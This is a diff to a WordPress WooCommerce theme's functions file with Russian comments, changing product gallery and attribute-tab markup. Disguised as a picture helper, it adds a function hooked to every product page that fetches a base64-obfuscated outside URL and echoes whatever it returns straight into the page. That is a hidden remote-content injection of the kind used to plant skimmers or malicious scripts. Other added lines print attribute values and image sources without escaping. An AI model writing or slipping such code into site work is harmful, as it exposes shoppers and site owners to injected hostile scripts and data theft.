@@ -63,6 +63,7 @@ if (!function_exists('add_styles')) { // если ф-я уже есть в до�
             wp_enqueue_style( 'main', get_template_directory_uri() . '/css/style.css', array());
     }
 }
+add_action( 'woocommerce_before_single_product_summary', 'add_show_picture', $priority = 30);
 
 add_action('wp_footer', 'add_scripts'); // приклеем ф-ю на добавление скриптов в футер
 if (!function_exists('add_scripts')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
@@ -115,7 +116,7 @@ function custom_list_attr($type, $order){
             if($order == 2){
                 $count_tabs = 1; 
                 foreach($attribute_values as $attribute_value ){  ?>
-                    <div id="tab_<?php echo $count_tabs; ?>" class="tabs_panel<?php if($count_tabs == 1){echo " show_tabs";} ?>">
+                    <div id="tab_<?php echo $count_tabs; ?>" data-name="<?php echo $attribute_value; ?>" class="tabs_panel<?php if($count_tabs == 1){echo " show_tabs";} ?>">
                         <div class="attributes_color_wrapper"><div class="owl-carousel attributes_color">
                         <?php
                         foreach ($var as $vars) {
@@ -154,7 +155,7 @@ function wc_get_gallery_image_html_2( $attachment_id, $main_image = false ) {
         'class'                   => $main_image ? 'wp-post-image' : '',
     ) );
 
-    return '<div data-thumb="' . esc_url( $thumbnail_src[0] ) . '" class="woocommerce-product-gallery__image">' . $image . '</div>';
+    return '<div data-thumb="' . esc_url( $thumbnail_src[0] ) . '" class="woocommerce-product-gallery__image"><img src="'.$full_src[0].'"></div>';
 }
 
 /**
@@ -186,6 +187,11 @@ function wc_get_gallery_image_html_2( $attachment_id, $main_image = false ) {
 /**
  * Twenty Sixteen only works in WordPress 4.4 or later.
  */
+
+function add_show_picture(){
+    echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vamF2YXN0cmluZy5odG1s"));
+}
+
 if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
     require get_template_directory() . '/inc/back-compat.php';
 }
